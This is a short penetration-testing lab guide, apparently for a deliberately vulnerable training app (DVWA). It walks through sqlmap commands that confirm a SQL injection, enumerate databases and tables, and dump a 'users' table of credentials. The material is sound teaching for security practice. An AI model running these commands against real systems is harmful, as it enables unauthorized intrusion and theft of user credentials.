# Lab: SQL Injection with sqlmap

## Scenario
You have been authorized to test a web application hosted at `http://target-ip/vulnerabilities/sqli/`. The application appears to have a search feature that might be vulnerable to SQL injection.

## Objectives
1. Identify the SQL injection vulnerability.
2. Enumerate the available databases.
3. Extract credentials from the database.

## Steps
1. **Identify the Target:** Navigate to the vulnerable web page and identify the parameters being passed in the URL (e.g., `?id=1`).
2. **Initial Scan:** Run `sqlmap` against the URL to confirm the vulnerability.
   ```bash
   sqlmap -u "http://target-ip/vulnerabilities/sqli/?id=1" --batch
   ```
3. **Database Enumeration:** Once vulnerable, find the databases.
   ```bash
   sqlmap -u "http://target-ip/vulnerabilities/sqli/?id=1" --dbs --batch
   ```
4. **Table Enumeration:** Select the target database (e.g., `dvwa`) and find its tables.
   ```bash
   sqlmap -u "http://target-ip/vulnerabilities/sqli/?id=1" -D dvwa --tables --batch
   ```
5. **Data Extraction:** Dump the contents of the `users` table.
   ```bash
   sqlmap -u "http://target-ip/vulnerabilities/sqli/?id=1" -D dvwa -T users --dump --batch
   ```

## Conclusion
You have successfully used `sqlmap` to automate the discovery and exploitation of an SQL injection vulnerability, leading to database enumeration and data extraction.
